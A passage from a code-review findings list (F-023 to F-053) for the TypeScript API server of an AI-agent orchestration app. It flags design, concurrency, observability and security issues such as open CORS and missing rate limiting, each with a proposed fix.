  4. **Compounds F-021.** A failed memory-store inside extractMemories also isn't audited; now the entire phase can fail with no ledger entry either.
- **Proposed fix:** see `fix.md` F-022 — `withPhaseAudit(phase, meetingId, fn)` wrapper around every callback emitting `meeting.<phase>.start`, `meeting.<phase>.complete` (with duration), `meeting.<phase>.failed` (with serialized error).

#### F-023 🟡 [code][perf] · Zod `extractedFactSchema` defined inside `extractMemories` callback
- **Where:** `apps/api/src/server.ts:202-212`.
- **Observation:** a multi-field Zod schema is constructed fresh on every meeting. Zod construction walks the shape and builds internal state; it's idempotent but not free. More importantly, the schema describes a domain concept ("a fact extracted from a meeting") that other modules (hippocampus, memory routes, audit) want to reference — trapping it in a server.ts closure means nobody else can import it.
- **Why it matters:**
  1. **Repeat allocation.** Every meeting pays the construction cost.
  2. **Local-only definition.** Other code either re-declares the shape (drift risk) or reaches into this file (bad).
  3. **Domain concept in wrong layer.** Composition-root files shouldn't own domain schemas.
- **Proposed fix:** see `fix.md` F-023 — hoist to `packages/contracts/src/memory.ts` as `meetingFactSchema` + exported `MeetingFact` type.

#### F-024 🟢 [code] · `meetingFactExtractor` is a 17-line inline closure used once then discarded
- **Where:** `apps/api/src/server.ts:214-231`.
- **Observation:** defined inline inside `extractMemories`, captures `structuredCompletion`, `MEETING_EXTRACTION_PROMPT`, `buildMeetingExtractionPrompt`, `extractedFactSchema` by closure, handed once to `extractMeetingMemories`. 17 lines of what looks like production logic embedded in a factory.
- **Why it matters:** minor cognitive load; reduces function length in server.ts; makes the extractor independently testable.
- **Proposed fix:** see `fix.md` F-024 — extract to `apps/api/src/meetings/extraction.ts` as `extractMeetingFactsViaLLM`.

#### F-025 🟡 [code][arch] · Anonymous effect-dependency bag in `executeMeetingDecisions`
- **Where:** `apps/api/src/server.ts:175`.
  ```ts
  const result = execute(meeting, snap, { upsertTask, updateTask, upsertApproval, appendChatMessage, flush });
  ```
- **Observation:** the inline `{ upsertTask, updateTask, upsertApproval, appendChatMessage, flush }` object has no named interface. The receiving function `executeMeetingDecisions` in `meetings/resolution.ts` hand-types its parameter.
- **Why it matters:**
  1. **No compile-time enforcement** that all callers pass the same shape. Drift is silent.
  2. **Adding a new effect** requires editing every call site to add it; no central type to update.
  3. **Tests must rebuild the bag** manually.
- **Proposed fix:** see `fix.md` F-025 — define `MeetingEffectsContext` in `packages/contracts/src/meetings.ts`; import at every call site.

#### F-026 🟢 [code] · Hardcoded scheduler config `{ tickIntervalMs: 30_000, defaultDailySyncIntervalMs: 300_000 }`
- **Where:** `apps/api/src/server.ts:270`.
- **Observation:** magic numbers at the composition root.
- **Why it matters:** same class as F-018 / F-021 — tuning knobs that can't be found.
- **Proposed fix:** see `fix.md` F-026 — `config/meetings.ts` exports `{ schedulerTickMs, defaultDailySyncMs }`.

#### F-027 🟡 [code][race] · `onEscalationComplete` forward-references `meetingScheduler`
- **Where:** `apps/api/src/server.ts:258` (callback body) vs `apps/api/src/server.ts:269` (declaration).
  ```ts
  // line 258 (inside onEscalationComplete callback)
  meetingScheduler.escalateUp(snap, meeting, ...);
  // line 269 (declaration)
  const meetingScheduler = new MeetingScheduler(...);
  ```
- **Observation:** the callback captures `meetingScheduler` by closure. JavaScript's late-binding semantics mean the reference resolves at *call time* (long after line 269 has run), so this works in production. But: if the callback were ever invoked synchronously during pipeline construction (e.g. a test harness that fires phase callbacks manually), it would hit TDZ (`ReferenceError: Cannot access 'meetingScheduler' before initialization`). And any reorder of the construction sequence silently breaks it.
- **Why it matters:**
  1. **Works by accident of timing.** No mechanism asserts that `meetingScheduler` is set before `onEscalationComplete` is called.
  2. **Fragile to reorder.** A refactor that swaps the order crashes on first escalation.
  3. **Symptom of circular construction dependency.** The pipeline needs the scheduler; the scheduler needs the pipeline's `run` method. Currently untangled by temporal ordering.
- **Proposed fix:** see `fix.md` F-027 — construct the scheduler first and inject it into `buildMeetingPipeline({ meetingScheduler })`; OR accept a `getMeetingScheduler: () => MeetingScheduler` factory on the pipeline config.

#### F-028 🟢 [code] · Same-name shadowing in pipeline callbacks
- **Where:** `apps/api/src/server.ts:150-190` — callbacks `synthesizeMeeting`, `resolveMeeting`, `executeMeetingDecisions`, `produceBrief` each import functions of the same name, aliased away to avoid collision:
  ```ts
  async synthesizeMeeting(meeting) {
    const { synthesizeMeeting: synthesize } = await import("./meetings/synthesis.js");
    ...
  }
  ```
- **Observation:** the same identifier means three different things within ~5 lines: the callback property name, the imported function name, the local alias. Readers must hold all three in their head.
- **Why it matters:** pure cognitive load; no correctness impact. Becomes a minor rename hazard.
- **Proposed fix:** see `fix.md` F-028 — rename imported functions to distinct identifiers (`synthesizeMeetingContributions`, `resolveMeetingConflicts`, etc.); delete aliases.

#### F-029 🟢 [code] · Anonymous `{ }` init block scope
- **Where:** `apps/api/src/server.ts:285-308`.
- **Observation:** a bare `{ ... }` block wraps the "re-seed service registry + auto-resume heartbeat" init sequence. It has no name, no signature, no export — just a scope-isolation trick.
- **Why it matters:** a named function (`initializeExistingCompany(snap, { heartbeatEngine, meetingScheduler })`) signals intent, makes the init testable, and lets the composition root stay linear. As written, a reader has to infer the block's purpose from the comment above it.
- **Proposed fix:** see `fix.md` F-029 — extract into a named async function.

#### F-030 🟡 [obs][code] · Seed failure logged to stderr but not audited
- **Where:** `apps/api/src/server.ts:289-294`.
  ```ts
  try {
    const { seeded, skipped } = await seedRegistry(snap.company.id);
    console.log(`[STARTUP] Re-seeded service registry: ${seeded} tools seeded, ${skipped} skipped`);
  } catch (err) {
    console.warn("[STARTUP] Registry re-seed failed:", err instanceof Error ? err.message : err);
  }
  ```
- **Observation:** a failed registry seed means agents boot with no or incomplete tool access — every subsequent beat that requests those tools will fail weirdly. The only signal is a single `console.warn` line. Audit ledger gets nothing. No operator alert, no degraded-mode flag.
- **Why it matters:**
  1. **Silent capability loss.** Agents appear active but missing tools; symptoms show up at beat-execution time, not startup.
  2. **Log scroll-out.** stderr lines rotate; audit entries persist.
  3. **Compounds F-011.** Error `.message` only; stack + cause dropped.
  4. **No degraded-mode signal.** Routes / UI don't know the registry is partial.
- **Proposed fix:** see `fix.md` F-030 — wrap seed-failure in `audit.auditError` with the company id + error; consider setting a "registry_degraded" flag that the UI surfaces.

#### F-031 🟡 [agent][arch] · Auto-resume heartbeat has no staleness check
- **Where:** `apps/api/src/server.ts:297-304`.
  ```ts
  const activeSprint = snap.sprints.find(
    (s) => s.id === snap.company.currentSprintId && (s.status === "executing" || s.status === "reviewing"),
  );
  if (activeSprint) {
    heartbeatEngine.start();
    meetingScheduler.start();
  }
  ```
- **Observation:** if the persisted sprint is in `executing` or `reviewing` state at boot, the heartbeat + meeting scheduler auto-start. No check on *when* the sprint was last touched. A sprint last beated 3 hours ago and one last beated 3 weeks ago both auto-resume identically.
- **Why it matters:**
  1. **Stale-state wakeups.** A sprint that hasn't progressed in days resumes silently; agents make decisions on ancient context.
  2. **No operator handoff.** When the server has been down for anything non-trivial, the operator should approve resumption, not infer it from boot logs.
  3. **Feeds back into F-002.** The in-memory snapshot may be equivalent to prod, but the real world has moved on — external tickets, conversations, PRs changed during the outage window.
  4. **Magic-string comparison.** Uses the string literals `"executing"` / `"reviewing"` instead of the typed enum from `packages/contracts/src/sprints.ts` — same class as F-012.
- **Proposed fix:** see `fix.md` F-031 — compute `lastBeatAt = max(beatRecords.startedAt for this sprint)`; if `now - lastBeatAt > threshold` (default 1 hour, config-driven), leave heartbeat stopped and emit a board-visible audit event requiring explicit resume. Import the sprint-status enum instead of string literals.

#### F-032 🟡 [type][code] · Beat-event type cast silently narrows future event types
- **Where:** `apps/api/src/server.ts:312`.
  ```ts
  const type = event.type as "beat_started" | "beat_completed" | "beat_failed" | "beat_idle";
  ```
- **Observation:** the runtime `emitBeatEvent` signature types `event.type` as a generic `string`. Here, server.ts asserts it's one of four specific values. If the runtime adds a fifth event type later (e.g. `beat_paused`, `beat_escalated`), TypeScript won't complain — the cast papers over the widening and the downstream `emitEmployeeActivity` gets an unexpected value typed as one of the known four.
- **Why it matters:**
  1. **Silent typing drift.** New runtime events don't surface as compile errors; they flow through with wrong typing.
  2. **Downstream handler bugs.** `emitEmployeeActivity` may have a switch on `type` with an `assertNever(default)` that now throws at runtime for no apparent reason, or worse, a `default` branch that silently handles the new event wrong.
  3. **Pattern spreads.** Once one cast exists, the next dev doing similar work copy-pastes it.
- **Proposed fix:** see `fix.md` F-032 — export a `BeatEventType` union from `@arceus/company-runtime`; import and narrow with `assertNever` in the default branch; if the value is truly open-ended, log + drop unknown types explicitly instead of casting.

#### F-033 🟡 [code][arch] · `onBeatEvent` subscription never unsubscribed
- **Where:** `apps/api/src/server.ts:311-317`.
  ```ts
  onBeatEvent((event) => {
    ...
    emitEmployeeActivity(event.role, type, `${event.type}: ...`, { ... });
  });
  ```
- **Observation:** the subscription is registered at module scope. `onBeatEvent` presumably returns an unsubscribe function (typical event-emitter API) — the return value is discarded. There's no handle to unsubscribe during teardown or in tests.
- **Why it matters:**
  1. **Teardown doesn't clean up.** `shutdown()` never removes the handler. During graceful shutdown a beat event can still fire after we thought we released resources.
  2. **Test pollution.** Tests that import anything pulling in `server.ts` attach this handler permanently for the test run.
  3. **Memory leak (small but real).** The event bus retains a reference to the closure, which closes over `heartbeatEngine`, which closes over everything it was built with. In a long-running test runner, these pile up.
- **Proposed fix:** see `fix.md` F-033 — capture the returned unsubscribe; call it from `shutdown()`. Move the subscription into `startServer(opts)` (F-005) so its lifetime matches the server.

#### F-034 🟢 [code] · `||` instead of `??` on summary fallback
- **Where:** `apps/api/src/server.ts:313`.
  ```ts
  emitEmployeeActivity(event.role, type, `${event.type}: ${event.data?.summary || event.beatId}`, { ... });
  ```
- **Observation:** uses `||` (falsy-or) instead of `??` (nullish-or). An empty-string summary (`""`) falls through to the beat id; an intentional `""` can't be distinguished from "no summary provided."
- **Why it matters:** minor. Probably the desired semantics in this case, but the modern default is `??` with explicit empty-string handling where needed.
- **Proposed fix:** see `fix.md` F-034 — switch to `??` and, if needed, add an explicit empty-string guard.

#### F-035 🟠 [sec] · CORS `origin: true` — echoes any request origin
- **Where:** `apps/api/src/server.ts:321`.
  ```ts
  await app.register(cors, { origin: true });
  ```
- **Observation:** Fastify's CORS plugin with `origin: true` reflects whatever `Origin` header the browser sends in `Access-Control-Allow-Origin`. In dev this is convenient; in production with credentialed requests (cookies, Authorization headers), **any website** can call this API from a victim user's browser and act on their behalf (CSRF via XHR).
- **Why it matters:**
  1. **Open CORS + credentialed auth = classic attack surface.** A malicious site can fetch Arceus endpoints with the victim's cookies.
  2. **Environment-blind.** Same permissive setting runs in prod as in dev. There's no gate.
  3. **Compounds F-036.** Without request-ID and rate-limit middleware, abuse scales trivially.
- **Proposed fix:** see `fix.md` F-035 — env-driven origin allowlist: `true` in dev, explicit domain list in prod (e.g. `["https://app.arceus.ai"]`); consider `credentials: true` gating separately.

#### F-036 🟠 [sec][obs] · No rate-limit, helmet, or request-ID middleware
- **Where:** `apps/api/src/server.ts:319-344`.
- **Observation:** three standard Fastify plugins are absent:
  - `@fastify/rate-limit` — no per-IP or per-token throttling. Unauthenticated endpoints (`/api/health`, some debug routes) can be abused trivially.
  - `@fastify/helmet` — no security headers (`Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `Referrer-Policy`).
  - **Request ID propagation** — Fastify can generate `req.id` and a client can pass `X-Request-Id`; nothing configured to propagate the ID into audit entries + structured logs.
- **Why it matters:**
  1. **DoS surface.** A single malicious client can flood the server; nothing pushes back.
  2. **Browser security hardening missing.** Any XSS-adjacent bug has an easier time.
  3. **Correlation impossible.** When a user reports "my action didn't work at 14:32," operators can't trace the one request through logs + audit + heartbeat records without manual grep.
  4. **Compounds F-035.** No rate-limit + open CORS = easy automated abuse.
- **Proposed fix:** see `fix.md` F-036 — register `@fastify/helmet`, `@fastify/rate-limit` with sensible defaults; configure `genReqId` with `X-Request-Id` header passthrough; thread `req.id` into audit entries.

#### F-037 🟡 [arch] · 19 routes hand-registered with inconsistent `routeDeps` passing
- **Where:** `apps/api/src/server.ts:323-344`.
  ```ts
  const routeDeps = { heartbeatEngine, meetingScheduler };

  await app.register(healthRoutes);               // no deps
  await app.register(companyRoutes, routeDeps);   // deps
  await app.register(strategyRoutes, routeDeps);  // deps
  await app.register(chatRoutes);                 // no deps
  ...
  ```
- **Observation:** 19 registrations, each hand-written. Only 4 (company, strategy, heartbeat, orchestrator) receive `routeDeps`. The other 15 presumably reach into module-level singletons (via `orchestration/state.ts`) for the same objects.
- **Why it matters:**
  1. **Inconsistent DI.** Same concern (how does a route get the heartbeat engine?), two mechanisms. Whichever one a new contributor picks is arbitrary.
  2. **DRY violation.** Adding a new route requires editing this file + `routes/index.ts`. A `for (const [, plugin] of Object.entries(routes)) await app.register(plugin, routeDeps)` loop collapses 19 lines to 1.
  3. **Coupled to F-013's singleton pattern.** The 15 deps-less routes only work because of the `setReactiveEventEmitter` / `setMeetingScheduler` singletons in state.ts — fix F-013 and you must fix this simultaneously.
- **Proposed fix:** see `fix.md` F-037 — decorate the app with a `services` container (`app.decorate("services", services)`); every route reads `app.services.*`; register via loop; delete `routeDeps` parameter.

#### F-038 🟡 [race][arch] · Audit ledger + trust scores started AFTER routes are registered
- **Where:** `apps/api/src/server.ts:325-344` (routes) then `:347` (`startAuditLedger()`) then `:350` (`await cpHydrateTrustScores()`) then `:379` (`app.listen`).
- **Observation:** the sequence registers routes *before* booting the audit ledger and hydrating governance trust scores. In practice no request can arrive before `app.listen` is called, so nothing breaks *today*. But the order is fragile.
- **Why it matters:**
  1. **Ordering drift risk.** A future refactor that moves `listen` earlier, or a Fastify `onReady` hook that accidentally triggers a handler during registration, silently produces requests that audit into a null ledger or check empty trust scores.
  2. **Startup phases not separated.** There are two conceptual phases — "build infrastructure" and "accept traffic" — conflated into one sequence.
  3. **Testing reproducibility.** A test that stubs `app.listen` but runs route handlers directly hits uninitialized state.
- **Proposed fix:** see `fix.md` F-038 — reorder: (1) hydrate + start ledger + trust scores, (2) register routes, (3) listen. Guard with a `ready` flag that every audit-touching code path asserts.

#### F-039 🟠 [arch][reliability] · Graceful shutdown: unawaited `stop()`, no timeout, no force-kill
- **Where:** `apps/api/src/server.ts:360-374`.
  ```ts
  async function shutdown(signal: string) {
    console.log(`[ARCEUS] ${signal} received — shutting down gracefully…`);
    try {
      heartbeatEngine.stop();        // ← not awaited
      meetingScheduler.stop();       // ← not awaited
      await drainAuditLedger();
      await teardown();
      await app.close();
      console.log("[ARCEUS] Server closed cleanly.");
      process.exit(0);
    } catch (err) {
      console.error("[ARCEUS] Error during shutdown:", err);
      process.exit(1);
    }
  }
  ```
- **Observation:** three shutdown failure modes:
  1. `heartbeatEngine.stop()` and `meetingScheduler.stop()` are called synchronously. If either returns a Promise (cancelling in-flight beats, finalizing a collecting meeting), the shutdown proceeds concurrently with that cleanup. `app.close()` can complete before engines have actually stopped.
  2. **No shutdown timeout.** If `app.close()` waits on an in-flight request (e.g. an agent call stuck in the LLM provider for 60s), the process hangs indefinitely; only the platform's SIGKILL escape hatch fires eventually.
  3. **No second-SIGTERM force-kill.** An operator sending a second SIGTERM expecting "forced" shutdown re-enters `shutdown()` concurrently — doesn't exit.
- **Why it matters:**
  1. **In-flight data loss.** Beats that were mid-mutation can be truncated.
  2. **Platform SIGKILL risk.** Graceful shutdown that hangs gets forcibly killed; any work not flushed to disk is gone.
  3. **Operator frustration during incidents.** "Restart the server" becomes a 60-second wait.
- **Proposed fix:** see `fix.md` F-039 — `await Promise.all([heartbeatEngine.stop(), meetingScheduler.stop()])`; wrap the whole shutdown in `Promise.race([shutdown, timeout(10_000)])` with a forced `exit(1)` on timeout; second SIGTERM → `process.exit(137)`.

#### F-040 🟡 [arch][sec] · `app.listen` not wrapped in try/catch
- **Where:** `apps/api/src/server.ts:379`.
  ```ts
  await app.listen({ port, host });
  ```
- **Observation:** no local error handling. If the listen fails (port in use, permission denied, bad address), the rejection propagates. With F-001's swallow-everything handlers in place, the process stays alive but with no HTTP listener — the silent-failure mode.
- **Why it matters:** overlaps with F-001's fix; keeping this as its own entry because the fix to F-001 alone doesn't help — the local site still deserves defensive wrapping so the error is attributed to *startup listen failure* specifically in audit.
- **Proposed fix:** see `fix.md` F-040 — wrap in try/catch; on error, log with a `startup.listen_failed` event type and `process.exit(1)`. Simpler and more specific than relying on the global handler.

#### F-041 🟡 [obs][code] · `void warmUpOpencode()` discards errors
- **Where:** `apps/api/src/server.ts:382`.
  ```ts
  void warmUpOpencode();
  ```
- **Observation:** the `void` keyword silences ESLint's `no-floating-promises` rule — deliberate fire-and-forget. The call's rejection is unhandled. If OpenCode warmup fails (binary missing, config invalid, network hiccup pulling deps), the process continues but first real beats hit a cold runtime and fail or stall.
- **Why it matters:**
  1. **Silent degradation.** The *expected* behavior of warmup is pre-start for latency; if warmup fails, the server works but the first beat is surprisingly slow.
  2. **No audit trail.** Operators can't correlate "first beat was slow" with "warmup failed 10 seconds earlier."
  3. **ESLint workaround, not a fix.** The `void` prefix is a lint bypass; the real answer is attaching a `.catch`.
- **Proposed fix:** see `fix.md` F-041 — attach `.catch` that routes to `audit.auditError` (with `serializeError`); if repeatable failures degrade agent latency, consider surfacing a "opencode_unhealthy" flag on the status endpoint.

#### F-042 🟢 [obs] · Demo-mode warning logged to console, not audited
- **Where:** `apps/api/src/server.ts:355-357`.
  ```ts
  if (orchestratorConfig.demoMode) {
    console.warn("[ARCEUS] ⚠ DEMO MODE ACTIVE — frontend-only constraints enabled for all agents");
  }
  ```
- **Observation:** demo mode visibly changes agent behavior. The warning goes to stderr only; nothing in the audit ledger, nothing surfaced on the UI status endpoint. An operator reviewing audit entries a month later cannot tell whether demo mode was on during a given period.
- **Why it matters:**
  1. **Audit completeness.** Behavioral-altering flags should be audit-visible.
  2. **UI visibility.** Users / operators benefit from a persistent badge while demo mode is on — not just a boot-time log.
- **Proposed fix:** see `fix.md` F-042 — audit a `system.demo_mode_active` event at startup when the flag is on; expose the flag on `/api/health` or a dedicated status endpoint so the UI can render a banner.

---

### `apps/api/src/orchestration/state.ts`

#### F-043 🟠 [arch][test] · 14 module-level mutable `let` exports form a process-wide god-singleton
- **Where:** `apps/api/src/orchestration/state.ts:109-121, 138, 143`.
  ```ts
  export let executionStatus: ExecutionStatus = "idle";
  export let eventBridgeStarted = false;
  export let promptCompletionPollerHandle: NodeJS.Timeout | null = null;
  export let activeExecution: ExecutionContext | null = null;
  export let developerWatchdog: NodeJS.Timeout | null = null;
  export let developerWorkspaceMonitor: NodeJS.Timeout | null = null;
  export let developerWorkspaceSnapshot = new Map<string, number>();
  export let developerStepLoopActive = false;
  export let ceoProposalInFlight = false;
  export let ceoProposalFailureCount = 0;
  export let ceoProposalCooldownUntilMs = 0;
  export let sprintCompletionTriggered = false;
  let reactiveEventEmitter: (...) => void | null = null;
  let meetingSchedulerRef: MeetingScheduler | null = null;
  ```
- **Observation:** 14 pieces of mutable state at module scope. Each is a separate ad-hoc singleton: one copy per process, shared across every consumer, no lifetime boundary, no encapsulation. Together they form the implicit "OrchestratorState" object — spread loose across a file.
- **Why it matters:**
  1. **No encapsulation boundary.** Internal representation changes (e.g. promoting `ceoProposalFailureCount: number` to a richer structure) ripple to every call site because callers touch the variable directly via setter.
  2. **Single-tenant per process, hard-baked.** Running two companies in one process, a shadow/eval orchestrator, or a second server instance requires rewriting this file.
  3. **Tests can't isolate.** Every test shares the same 14 vars; `resetOrchestratorState()` is the only fence, and any new `let` that someone forgets to reset quietly breaks the next test.
  4. **Parallel tests impossible in-process.** State races as soon as Vitest uses more than one worker in the same file.
  5. **Shutdown has no clean teardown story.** There's no constructor/destructor pair; cleanup is ad-hoc.
  6. **Every principle violated at once.** Encapsulation, SRP, DIP, purity, explicit lifecycle, testability, multi-tenancy — each weakened here.
- **Proposed fix:** see `fix.md` F-043 — wrap all 14 fields in an `OrchestrationState` class; construct once inside `startServer()`; inject as `app.services.orchestration`; delete the 12 setters.

#### F-044 🟠 [arch][code] · 12 setter one-liners exist only as ESM workaround
- **Where:** `apps/api/src/orchestration/state.ts:124-135`.
  ```ts
  export function setExecutionStatus(s: ExecutionStatus) { executionStatus = s; }
  export function setEventBridgeStarted(v: boolean) { eventBridgeStarted = v; }
  // ... 10 more identical one-liners
  ```
- **Observation:** ESM imports are read-only bindings, so `export let` can't be reassigned from outside. The file compensates with 12 trivial setters. Every one has the exact same shape: take a value, assign it to the backing variable.
- **Why it matters:**
  1. **Dead weight.** 12 × `function x(v) { y = v; }` adds ~15 lines of pure boilerplate. No validation, no invariant enforcement, no side effects — just assignment.
  2. **Lost opportunity for invariants.** A setter is the *right* place to validate transitions (`setExecutionStatus("done")` from `"idle"` is probably a bug). Today's setters accept anything.
  3. **Pattern encourages more of itself.** Every new `let` spawns another setter. The file grows linearly with state.
  4. **Same flaw as F-013/F-037** applied to 12 more variables. Scale of the pattern, not novelty.
- **Proposed fix:** see `fix.md` F-044 — collapsing into the `OrchestrationState` class (F-043) deletes all 12 at once; methods encapsulate transitions with validation.

#### F-045 🟠 [code][arch] · Internal Map/Array references leak through getters
- **Where:** `apps/api/src/orchestration/state.ts:148, 150`.
  ```ts
  export function getAgentSessionsMap() { return agentSessions; }      // live Map
  export function getArtifacts() { return artifacts; }                  // live Array
  export function getAgentSessions() { return Object.fromEntries(agentSessions); }  // copy — good
  ```
- **Observation:** `getAgentSessionsMap()` returns the **live** `Map` reference; `getArtifacts()` returns the **live** `Array`. External callers can mutate internal state directly:
  ```ts
  getArtifacts().push(fake);          // direct mutation
  getAgentSessionsMap().clear();      // wipes all agent state
  ```
  Note the inconsistency: `getAgentSessions()` (no "Map") *does* return a copy. Two getters for the same data with opposite safety semantics.
- **Why it matters:**
  1. **Encapsulation broken.** Internal state is mutable from anywhere that calls the getter.
  2. **Invariants unenforceable.** State cannot maintain any consistency property — someone can bypass the `upsert*` API and `.set(id, anything)` directly.
  3. **Bugs are invisible.** A mutation via the live reference leaves no trace — no audit entry, no event, no log.
  4. **Type safety doesn't help.** The type is `Map<...>` — TypeScript doesn't warn about mutation.
- **Proposed fix:** see `fix.md` F-045 — return `ReadonlyMap<...>` / `ReadonlyArray<...>` types via casts OR return defensive copies. Consolidate on one consistent semantic.

#### F-046 🟡 [reliability][arch] · Timers cleaned up only by `resetOrchestratorState`, never during shutdown
- **Where:** `apps/api/src/orchestration/state.ts:163, 165, 166` inside `resetOrchestratorState()`.
  ```ts
  if (promptCompletionPollerHandle) { clearInterval(promptCompletionPollerHandle); ... }
  if (developerWatchdog) { clearTimeout(developerWatchdog); ... }
  if (developerWorkspaceMonitor) { clearInterval(developerWorkspaceMonitor); ... }
  ```
- **Observation:** three `NodeJS.Timeout` handles. Cleanup logic exists — but lives only inside `resetOrchestratorState()`, which is called from tests (probably) and from nowhere in the production shutdown path.
- **Why it matters:**
  1. **Event loop stays pinned.** After `app.close()` returns, these timers keep firing. Node's event loop won't exit until all timers are cleared — so `process.exit(0)` in F-039's shutdown is what actually terminates, not graceful completion.
  2. **Work continues against a "shutdown" process.** A developer-watchdog firing post-shutdown can trigger state mutations on a half-torn-down engine.
  3. **Test/prod path divergence.** Tests use one cleanup mechanism; prod uses another (or none). Behavior diverges.
  4. **Compounds F-039.** The shutdown flaw gets worse because even if we fix `stop()` awaiting, the timers still leak.
- **Proposed fix:** see `fix.md` F-046 — call orchestration-state cleanup from the shutdown path (bundle with F-039); make timer ownership part of the `OrchestrationState` class so lifecycle is explicit.

#### F-047 🟡 [perf][code] · `pendingPromptCompletions` Map has no size bound or TTL sweep
- **Where:** `apps/api/src/orchestration/state.ts:111`.
  ```ts
  export const pendingPromptCompletions = new Map<string, {
    resolve: () => void;
    reject: (err: Error) => void;
    timer: NodeJS.Timeout
  }>();
  ```
- **Observation:** tracks pending "prompt completion" promises keyed by some ID. Each entry carries a `resolve`/`reject` pair and a `timer`. If a timer fires without calling `resolve`/`reject`, or if an agent is abandoned before either, the entry leaks forever. No max size, no periodic sweep, no TTL.
- **Why it matters:**
  1. **Memory leak under failure modes.** Any path that adds an entry without a corresponding `resolve`/`reject`/timer-firing cleanup grows the Map unboundedly.
  2. **Long-running processes degrade.** A week of production with a rare leak path and the Map is huge.
  3. **Debugging hard.** Nothing surfaces Map size as a metric.
- **Proposed fix:** see `fix.md` F-047 — ensure every code path (`resolve`, `reject`, timer onfire) deletes its key; add a `maxPending` ceiling; expose Map size as an observability metric.

#### F-048 🟡 [arch][code] · CEO-proposal state is 3 unrelated variables, encoding an implicit state machine
- **Where:** `apps/api/src/orchestration/state.ts:118-120`.
  ```ts
  export let ceoProposalInFlight = false;
  export let ceoProposalFailureCount = 0;
  export let ceoProposalCooldownUntilMs = 0;
  ```
- **Observation:** three loose variables representing stages of a cooldown lifecycle (idle → in-flight → failing → cooldown → idle). Because they're independent, invalid combinations are expressible in code — `inFlight=true` *and* `cooldownUntilMs > Date.now()` makes no logical sense but is perfectly legal here.
- **Why it matters:**
  1. **Impossible states are expressible.** The type system can't say "you can't be both in-flight and in cooldown."
  2. **Transitions scattered.** Logic elsewhere in the codebase manipulates each variable separately. No single site to audit the state machine.
  3. **Bug potential high.** A partial update (set `inFlight=false` but forget to set `cooldownUntilMs=0`) silently leaves stale state.
- **Proposed fix:** see `fix.md` F-048 — replace with a discriminated union (`type CeoProposalState = { kind: "idle" } | { kind: "inFlight"; startedAt } | { kind: "cooldown"; until; failures }`); make invalid states unrepresentable.

#### F-049 🟡 [arch][code] · Workspace-path computation duplicated between state.ts and infra/opencode.ts
- **Where:** `apps/api/src/orchestration/state.ts:101-104` and `apps/api/src/infra/opencode.ts:20-23`.
  ```ts
  // state.ts
  export const workspaceRoot = resolve(process.cwd(), "..", "..");
  export const productDir = existsSync(resolve(workspaceRoot, "workspace")) || !process.cwd().startsWith("/app")
    ? resolve(workspaceRoot, "workspace")
    : resolve(process.cwd(), "workspace");

  // opencode.ts (near-identical)
  const repoRoot = resolve(projectRoot, "..", "..");
  const productWorkspace = existsSync(resolve(repoRoot, "workspace")) || !projectRoot.startsWith("/app")
    ? resolve(repoRoot, "workspace")
    : resolve(projectRoot, "workspace");
  ```
- **Observation:** same defensive logic in two places. Any change (rename `workspace` → `.workspace`, add a third fallback, support env override) must be applied to both or they silently drift.
- **Why it matters:** DRY violation with concrete prior evidence — we just renamed-and-reverted `workspace/` in this session; the two sites had to be edited in lockstep.
- **Proposed fix:** see `fix.md` F-049 — extract to `apps/api/src/config/paths.ts` as `resolveProductDir()`; import from both.

#### F-050 🟡 [arch] · `existsSync` synchronous I/O at module load
- **Where:** `apps/api/src/orchestration/state.ts:102`.
- **Observation:** the `productDir` constant is computed at module-load time via `existsSync(...)`. Two side effects:
  1. Synchronous filesystem probe runs during import (blocks the event loop briefly).
  2. The answer is frozen at import — if the directory is created or deleted later, `productDir` is stale.
- **Why it matters:**
  1. **Import-time side effects.** Same class as F-005 (import-time behavior); tests importing state.ts pay the fs probe.
  2. **Stale-answer risk.** A test that creates the `workspace/` directory *after* importing state.ts still gets the import-time answer.
- **Proposed fix:** see `fix.md` F-050 — make `productDir` lazy (a function, not a constant); evaluate on first access.

#### F-051 🟡 [arch][code] · LLM DTO types mixed with runtime state types
- **Where:** `apps/api/src/orchestration/state.ts:52-86`.
  ```ts
  export type MeetingAgendaInput = { ... };
  export type MeetingDecisionInput = { ... };
  export type MeetingLearningInput = { ... };
  export type TaskModificationInput = { ... };
  export type MemoryModificationInput = { ... };
  ```
- **Observation:** five `*Input` types that are clearly **LLM structured-output DTOs** (they describe the shape the LLM is asked to return). They live in an orchestration-*state* file.
- **Why it matters:**
  1. **Wrong layer.** DTOs describe the API contract between the LLM and the application; they belong in `packages/contracts/` where other modules (validators, tests, route schemas) can share them without pulling in orchestration-state.
  2. **Coupling.** Any consumer that wants the DTO type has to import `orchestration/state.ts`, dragging in all the mutable-state exports.
  3. **Unrelated change cadence.** DTOs change when LLM prompts/schemas evolve; orchestration state changes for different reasons. Co-locating them violates SRP.
- **Proposed fix:** see `fix.md` F-051 — move all 5 `*Input` types to `packages/contracts/src/meetings.ts` (or `tasks.ts`/`memory.ts` respectively); state.ts keeps only runtime types (`AgentSessionState`, `Artifact`, `ExecutionContext`, `ExecutionStatus`).

#### F-052 🟡 [type][arch] · Status string-unions not derived from contract schemas
- **Where:** `apps/api/src/orchestration/state.ts:14, 19, 43`.
  ```ts
  status: "idle" | "working" | "done" | "error";          // line 14
  lastToolStatus: "invoked" | "completed" | null;         // line 19
  export type ExecutionStatus = "idle" | "planning" | ...; // line 43
  ```
- **Observation:** three status enums hand-written as inline string unions. No connection to Zod schemas in `packages/contracts/` (where enums like `sprintStatusSchema` and `taskStatusSchema` already exist for similar concepts).
- **Why it matters:**
  1. **Schema drift risk.** If DB values / API values are defined via Zod enum elsewhere and these are written by hand, renaming a status value in contracts doesn't force this file to update.
  2. **No runtime validation.** These types can't be used to parse incoming data because they're TS-only.
  3. **Inconsistent pattern.** Other parts of the codebase use Zod-derived types; these don't.
- **Proposed fix:** see `fix.md` F-052 — declare as Zod enums in `packages/contracts/`; `z.infer<typeof agentStatusSchema>` in state.ts.

#### F-053 🟡 [code] · Silent `?? []` fallback on snapshot fields
- **Where:** `apps/api/src/orchestration/state.ts:153-154`.
  ```ts
  export function getTransitions() { return getSnapshot().transitions ?? []; }
  export function getFeedbackRounds() { return getSnapshot().feedbackRounds ?? []; }
  ```
- **Observation:** if the snapshot doesn't include `transitions` or `feedbackRounds`, the getter silently returns an empty array. Whether `undefined` here represents "legitimately empty" or "bug — should have been loaded" is indistinguishable.
- **Why it matters:**
  1. **Hidden bugs.** A load failure that drops `transitions` presents as "no transitions yet." Calling code makes decisions on empty data.
